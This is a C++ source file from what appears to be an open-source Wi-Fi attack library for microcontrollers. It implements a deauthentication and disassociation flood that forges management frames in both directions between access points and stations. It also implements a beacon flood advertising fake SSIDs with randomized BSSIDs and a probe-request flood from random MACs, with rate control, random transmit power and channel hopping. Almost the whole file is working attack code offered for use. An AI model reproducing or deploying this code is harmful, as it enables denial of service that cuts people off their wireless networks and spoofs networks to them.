/* DeautherX-lib — https://github.com/BlackTechX011/DeautherX-lib
   MIT License */

#include "DeautherAttack.h"
#include "../radio/DeautherRadio.h"
#include "../packets/DeautherPackets.h"
#include "../utils/DeautherMac.h"
#include "../utils/DeautherChannel.h"
#include "../utils/DeautherStrHelper.h"

// ─── Helpers ─────────────────────────────────────────────────────────────────

static uint8_t _random_mac[6];

// ─── Public API ───────────────────────────────────────────────────────────────

void DeautherAttack::startDeauth(const DeauthConfig& cfg) {
    _deauth_cfg = cfg;
    _deauth_state.active        = true;
    _deauth_state.pkt_counter   = 0;
    _deauth_state.total_pkts    = 0;
    _deauth_state.last_pkt_time = millis();
    _deauth_state.target_idx    = 0;
    if (_attack_start == 0) _attack_start = millis();
}

void DeautherAttack::startBeacon(const BeaconConfig& cfg) {
    _beacon_cfg = cfg;
    _beacon_state.active        = true;
    _beacon_state.pkt_counter   = 0;
    _beacon_state.total_pkts    = 0;
    _beacon_state.last_pkt_time = millis();
    _beacon_state.ssid_idx      = 0;
    if (_attack_start == 0) _attack_start = millis();
}

void DeautherAttack::startProbe(const ProbeConfig& cfg) {
    _probe_cfg = cfg;
    _probe_state.active        = true;
    _probe_state.pkt_counter   = 0;
    _probe_state.total_pkts    = 0;
    _probe_state.last_pkt_time = millis();
    _probe_state.ssid_idx      = 0;
    if (_attack_start == 0) _attack_start = millis();
}

void DeautherAttack::start(const DeauthConfig* d, const BeaconConfig* b, const ProbeConfig* p) {
    _attack_start = millis();
    if (d) startDeauth(*d);
    if (b) startBeacon(*b);
    if (p) startProbe(*p);
}

void DeautherAttack::stopDeauth() { 
    _deauth_state.active = false; 
    if (!isRunning()) _attack_start = 0;
}

void DeautherAttack::stopBeacon() { 
    _beacon_state.active = false; 
    if (!isRunning()) _attack_start = 0;
}

void DeautherAttack::stopProbe()  { 
    _probe_state.active = false; 
    if (!isRunning()) _attack_start = 0;
}

void DeautherAttack::stop() {
    _deauth_state.active = _beacon_state.active = _probe_state.active = false;
    _attack_start = 0;
}

void DeautherAttack::onPacketSent(PacketSentCb cb) { _pkt_cb = cb; }

// ─── Update loop ──────────────────────────────────────────────────────────────

void DeautherAttack::update() {
    if (!isRunning()) return;

    if (_deauth_state.active) _updateDeauth();
    if (_beacon_state.active) _updateBeacon();
    if (_probe_state.active)  _updateProbe();

    // Per-second tick
    unsigned long now = millis();
    if (now - _last_sec_tick >= 1000) {
        _tickPerSecond();
        _last_sec_tick = now;
    }
}

// ─── Deauth Update ────────────────────────────────────────────────────────────

void DeautherAttack::_updateDeauth() {
    if (_deauth_cfg.targets.empty()) return;

    // Timeout check
    if (_deauth_cfg.timeout > 0 && millis() - _attack_start >= _deauth_cfg.timeout) {
        stopDeauth(); return;
    }
    if (_deauth_cfg.max_pkts > 0 && _deauth_state.total_pkts >= _deauth_cfg.max_pkts) {
        stopDeauth(); return;
    }

    uint32_t interval = (_deauth_cfg.pkt_rate > 0) ? (1000 / _deauth_cfg.pkt_rate) : 50;
    if (millis() - _deauth_state.last_pkt_time < interval) return;

    const DeautherTarget* target = _deauth_cfg.targets.iterate();
    if (!target) return;

    uint8_t ch = DChannel::next(target->channels);

    if (_deauth_cfg.random_tx) DRadio::setRandomTxPower(5.0f, 20.5f);

    uint8_t buf[26];
    bool sent = false;

    // Deauth frame: AP → Station
    if (_deauth_cfg.deauth) {
        DPackets::buildDeauth(buf, target->sender, target->receiver, _deauth_cfg.reason);
        if (DRadio::send(ch, buf, 26)) {
            _deauth_state.pkt_counter++;
            _deauth_state.total_pkts++;
            _tmp_pkt_rate++;
            sent = true;
        }
    }

    // Disassoc frame: AP → Station
    if (_deauth_cfg.disassoc) {
        DPackets::buildDisassoc(buf, target->sender, target->receiver, _deauth_cfg.reason);
        if (DRadio::send(ch, buf, 26, false)) {
            _deauth_state.pkt_counter++;
            _deauth_state.total_pkts++;
            _tmp_pkt_rate++;
            sent = true;
        }
    }

    // Send both directions if station is not broadcast
    if (!DMac::isBroadcast(target->receiver)) {
        // Station → AP
        if (_deauth_cfg.deauth) {
            DPackets::buildDeauth(buf, target->receiver, target->sender, _deauth_cfg.reason);
            DRadio::send(ch, buf, 26, false);
            _deauth_state.pkt_counter++;
            _deauth_state.total_pkts++;
            _tmp_pkt_rate++;
        }
        if (_deauth_cfg.disassoc) {
            DPackets::buildDisassoc(buf, target->receiver, target->sender, _deauth_cfg.reason);
            DRadio::send(ch, buf, 26, false);
            _deauth_state.pkt_counter++;
            _deauth_state.total_pkts++;
            _tmp_pkt_rate++;
        }
    }

    _deauth_state.last_pkt_time = millis();
    if (sent && _pkt_cb) _pkt_cb(0, _deauth_state.total_pkts);
}

// ─── Beacon Update ────────────────────────────────────────────────────────────

void DeautherAttack::_updateBeacon() {
    if (_beacon_cfg.ssids.empty()) return;

    if (_beacon_cfg.timeout > 0 && millis() - _attack_start >= _beacon_cfg.timeout) {
        stopBeacon(); return;
    }

    uint32_t interval = (_beacon_cfg.pkt_rate > 0) ? (1000 / _beacon_cfg.pkt_rate) : 100;
    if (millis() - _beacon_state.last_pkt_time < interval) return;

    if (_beacon_cfg.random_tx) DRadio::setRandomTxPower(0.0f, 20.5f);

    uint8_t ch = DChannel::next(_beacon_cfg.channels);

    uint8_t bssid[6];
    memcpy(bssid, _beacon_cfg.bssid, 6);
    bssid[5] = _beacon_state.ssid_idx; // unique BSSID per SSID

    if (_beacon_cfg.random_mac) {
        DMac::randomize(bssid);
    }

    for (uint8_t i = 0; i < _beacon_cfg.ssids.count(); i++) {
        const char* ssid = _beacon_cfg.ssids.getSSID(i);
        bool wpa2 = _beacon_cfg.ssids.getWPA2(i) || _beacon_cfg.wpa2;

        bssid[5] = _beacon_cfg.bssid[5] + i;

        uint8_t buf[128];
        uint16_t len = DPackets::buildBeacon(buf, bssid, ssid, ch, wpa2, _beacon_cfg.interval1s);
        memcpy(&buf[4], _beacon_cfg.receiver, 6);

        if (DRadio::send(ch, buf, len, false)) {
            _beacon_state.pkt_counter++;
            _beacon_state.total_pkts++;
            _tmp_pkt_rate++;
        }
    }

    _beacon_state.last_pkt_time = millis();
    if (_pkt_cb) _pkt_cb(1, _beacon_state.total_pkts);
}

// ─── Probe Update ─────────────────────────────────────────────────────────────

void DeautherAttack::_updateProbe() {
    if (_probe_cfg.ssids.empty()) return;

    if (_probe_cfg.timeout > 0 && millis() - _attack_start >= _probe_cfg.timeout) {
        stopProbe(); return;
    }

    uint32_t interval = (_probe_cfg.pkt_rate > 0) ? (1000 / _probe_cfg.pkt_rate) : 100;
    if (millis() - _probe_state.last_pkt_time < interval) return;

    uint8_t ch = DChannel::next(_probe_cfg.channels);

    for (uint8_t si = 0; si < _probe_cfg.ssids.count(); si++) {
        uint8_t src[6];
        if (_probe_cfg.random_mac) {
            DMac::randomize(src);
        } else {
            memcpy(src, _probe_cfg.sender, 6);
        }

        uint8_t buf[80];
        uint16_t len = DPackets::buildProbe(buf, src, _probe_cfg.ssids.getSSID(si));
        memcpy(&buf[4], _probe_cfg.receiver, 6);

        for (uint8_t f = 0; f < _probe_cfg.frames_per_ssid; f++) {
            if (DRadio::send(ch, buf, len, false)) {
                _probe_state.pkt_counter++;
                _probe_state.total_pkts++;
                _tmp_pkt_rate++;
            }
        }
    }

    _probe_state.last_pkt_time = millis();
    if (_pkt_cb) _pkt_cb(2, _probe_state.total_pkts);
}

// ─── Per-second tick ──────────────────────────────────────────────────────────

void DeautherAttack::_tickPerSecond() {
    _pkt_rate = _tmp_pkt_rate;
    _tmp_pkt_rate = 0;
    _deauth_state.pkt_counter = 0;
    _beacon_state.pkt_counter = 0;
    _probe_state.pkt_counter  = 0;
    // Reset per-second BSSID suffix for beacon
    DRadio::setTxPower(20.5f);
}

// ─── Status ───────────────────────────────────────────────────────────────────

bool DeautherAttack::isRunning()     const { return _deauth_state.active || _beacon_state.active || _probe_state.active; }
bool DeautherAttack::deauthRunning() const { return _deauth_state.active; }
bool DeautherAttack::beaconRunning() const { return _beacon_state.active; }
bool DeautherAttack::probeRunning()  const { return _probe_state.active; }
uint32_t DeautherAttack::getPacketRate()  const { return _pkt_rate; }
uint32_t DeautherAttack::getDeauthPkts() const { return _deauth_state.total_pkts; }
uint32_t DeautherAttack::getBeaconPkts() const { return _beacon_state.total_pkts; }
uint32_t DeautherAttack::getProbePkts()  const { return _probe_state.total_pkts; }
unsigned long DeautherAttack::getRuntime() const {
    return (_attack_start > 0) ? millis() - _attack_start : 0;
}

String DeautherAttack::getStatusJSON() const {
    String j = F("{");
    j += F("\"running\":"); j += DStr::boolean(isRunning()); j += ',';
    j += F("\"deauth\":{\"active\":"); j += DStr::boolean(_deauth_state.active);
    j += F(",\"pkts\":"); j += _deauth_state.total_pkts; j += F("},");
    j += F("\"beacon\":{\"active\":"); j += DStr::boolean(_beacon_state.active);
    j += F(",\"pkts\":"); j += _beacon_state.total_pkts; j += F("},");
    j += F("\"probe\":{\"active\":"); j += DStr::boolean(_probe_state.active);
    j += F(",\"pkts\":"); j += _probe_state.total_pkts; j += F("},");
    j += F("\"pkt_rate\":"); j += _pkt_rate; j += ',';
    j += F("\"runtime_ms\":"); j += getRuntime();
    j += '}';
    return j;
}

void DeautherAttack::printStatus() const {
    Serial.print(F("[Attack] running="));
    Serial.print(isRunning() ? F("yes") : F("no"));
    Serial.print(F("  rate="));
    Serial.print(_pkt_rate);
    Serial.print(F(" pkt/s  deauth="));
    Serial.print(_deauth_state.total_pkts);
    Serial.print(F("  beacon="));
    Serial.print(_beacon_state.total_pkts);
    Serial.print(F("  probe="));
    Serial.print(_probe_state.total_pkts);
    Serial.print(F("  runtime="));
    Serial.println(DStr::duration(getRuntime()));
}

// ─── Low-level single-shot senders ────────────────────────────────────────────

bool DeautherAttack::sendDeauth(const uint8_t* ap, const uint8_t* sta, uint8_t reason, uint8_t ch) {
    uint8_t buf[26];
    DPackets::buildDeauth(buf, ap, sta, reason);
    return DRadio::send(ch, buf, 26);
}

bool DeautherAttack::sendBeacon(const uint8_t* bssid, const char* ssid, uint8_t ch, bool wpa2) {
    uint8_t buf[128];
    uint16_t len = DPackets::buildBeacon(buf, bssid, ssid, ch, wpa2);
    return DRadio::send(ch, buf, len);
}

bool DeautherAttack::sendProbe(const uint8_t* src, const char* ssid, uint8_t ch) {
    uint8_t buf[80];
    uint16_t len = DPackets::buildProbe(buf, src, ssid);
    return DRadio::send(ch, buf, len);
}

bool DeautherAttack::sendRaw(const uint8_t* buf, uint16_t len, uint8_t ch) {
    return DRadio::send(ch, buf, len);
}
